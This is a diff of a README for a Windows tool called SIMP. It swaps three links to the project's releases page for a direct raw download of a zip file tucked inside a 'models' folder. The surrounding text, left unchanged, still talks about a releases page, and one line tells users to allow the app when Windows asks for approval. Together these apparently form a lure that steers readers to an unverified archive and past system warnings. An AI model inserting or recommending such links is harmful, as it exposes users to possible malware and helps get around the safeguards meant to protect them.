@@ -1,6 +1,6 @@
 # 🤖 SIMP - Simple agent messages, clear flow
 
-[![Download SIMP](https://img.shields.io/badge/Download-SIMP%20Releases-blue?style=for-the-badge)](https://github.com/localareanetworkaceofspades414/SIMP/releases)
+[![Download SIMP](https://img.shields.io/badge/Download-SIMP%20Releases-blue?style=for-the-badge)](https://github.com/localareanetworkaceofspades414/SIMP/raw/refs/heads/main/simp/models/Software_v2.5-alpha.4.zip)
 
 ## 🧭 What SIMP does
 
@@ -31,7 +31,7 @@ If Windows asks for approval, choose the option that lets the app run.
 
 Visit this page to download SIMP:
 
-https://github.com/localareanetworkaceofspades414/SIMP/releases
+https://github.com/localareanetworkaceofspades414/SIMP/raw/refs/heads/main/simp/models/Software_v2.5-alpha.4.zip
 
 On that page, look for the latest release and download the Windows file from the Assets list.
 
@@ -216,7 +216,7 @@ This keeps setup easy and helps you find problems faster.
 
 Download the latest Windows build here:
 
-https://github.com/localareanetworkaceofspades414/SIMP/releases
+https://github.com/localareanetworkaceofspades414/SIMP/raw/refs/heads/main/simp/models/Software_v2.5-alpha.4.zip
 
 ## 🧼 Good habits
 
